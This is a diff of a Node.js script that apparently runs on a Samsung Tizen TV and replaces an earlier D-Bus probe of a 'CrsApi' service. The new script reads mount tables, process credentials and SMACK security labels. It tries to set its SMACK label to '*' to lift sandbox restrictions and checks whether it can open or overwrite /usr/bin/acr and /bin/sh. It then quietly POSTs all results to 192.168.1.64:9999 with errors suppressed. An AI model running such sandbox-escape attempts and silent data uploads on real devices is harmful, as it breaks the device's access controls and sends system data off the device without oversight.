@@ -1,42 +1,39 @@
 "use strict";
+// audit89.js - diagnose mount state after remount broke exec. Read /proc/mounts via fs.
+var fs = require("fs");
 var http = require("http");
-var cp = require("child_process");
+var HOST = "192.168.1.64";
+var PORT = 9999;
 
 function post(path, body) {
     var data = JSON.stringify(body);
-    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
+    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
         headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
-        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
-    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
+        function (res) { try { res.resume(); } catch (e) {} });
+    req.on("error", function () {});
     req.write(data);
     req.end();
 }
 
-function sh(cmd, cap) {
-    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 12000 }).slice(0, cap || 8000); }
-    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
-}
-
 var out = {};
 out.started = new Date().toISOString();
-var OBJ = "/samsung/tizen/CrsApi";
-var DEST = "samsung.tizen.CrsApi";
 
-out.full_intro = sh("gdbus introspect --system --dest " + DEST + " --object-path " + OBJ, 12000);
+try { out.mounts = fs.readFileSync("/proc/mounts", "utf8"); } catch (e) { out.mounts = "ERR " + e.message; }
+try { out.self_mounts = fs.readFileSync("/proc/self/mounts", "utf8"); } catch (e) { out.self_mounts = "ERR " + e.message; }
+try { out.self_status = fs.readFileSync("/proc/self/status", "utf8").split("\n").filter(function (l) { return l.indexOf("Uid") === 0 || l.indexOf("Gid") === 0 || l.indexOf("Cap") === 0 || l.indexOf("NoNewPrivs") === 0 || l.indexOf("Seccomp") === 0; }).join(" | "); } catch (e) { out.self_status = "ERR " + e.message; }
+try { out.smack = fs.readFileSync("/proc/self/attr/current", "utf8"); } catch (e) { out.smack = "ERR " + e.message; }
+try { out.smackfs = fs.readFileSync("/proc/self/attr/smack/current", "utf8"); } catch (e) { out.smackfs = "ERR " + e.message; }
 
-// call every method visible (no-arg guesses); CrsApi methods take no args per earlier strings
-var methods = ["GetChannelNumber", "GetChannelName", "GetChannelScrollStatus",
-               "GetCallsign", "GetChannelTitle", "GetTitle", "GetCurrentSourceInfo",
-               "GetChannelResult", "GetOTTInfo", "GetDeviceInfo", "GetState", "GetSource"];
-out.calls = {};
-for (var i = 0; i < methods.length; i++) {
-    out.calls[methods[i]] = sh("gdbus call --system --dest " + DEST + " --object-path " + OBJ +
-        " --method " + DEST + "." + methods[i] + " 2>&1 | head -3", 700);
-}
+// try writing SMACK label to star (unrestricted)
+try { fs.writeFileSync("/proc/self/attr/current", "*"); out.smack_write = "OK"; } catch (e) { out.smack_write = "ERR " + e.message; }
 
-// also Properties.GetAll on the CrsApi interface
-out.props = sh("gdbus call --system --dest " + DEST + " --object-path " + OBJ +
-    " --method org.freedesktop.DBus.Properties.GetAll " + DEST + " 2>&1 | head -5", 1200);
+// can we read /usr/bin/acr?
+try { var fd = fs.openSync("/usr/bin/acr", "r"); fs.closeSync(fd); out.acr_read = "OK"; } catch (e) { out.acr_read = "ERR " + e.message; }
+// can we write?
+try { var fd2 = fs.openSync("/usr/bin/acr", "r+"); fs.closeSync(fd2); out.acr_write = "OK"; } catch (e) { out.acr_write = "ERR " + e.message; }
 
-post("/ocr_crsapi2", out);
-post("/ocr_crsapi2_done", { started: out.started });
+// check /bin/sh
+try { var fd3 = fs.openSync("/bin/sh", "r"); fs.closeSync(fd3); out.sh_read = "OK"; } catch (e) { out.sh_read = "ERR " + e.message; }
+
+post("/p89_diag", out);
+post("/p89_done", { started: out.started });
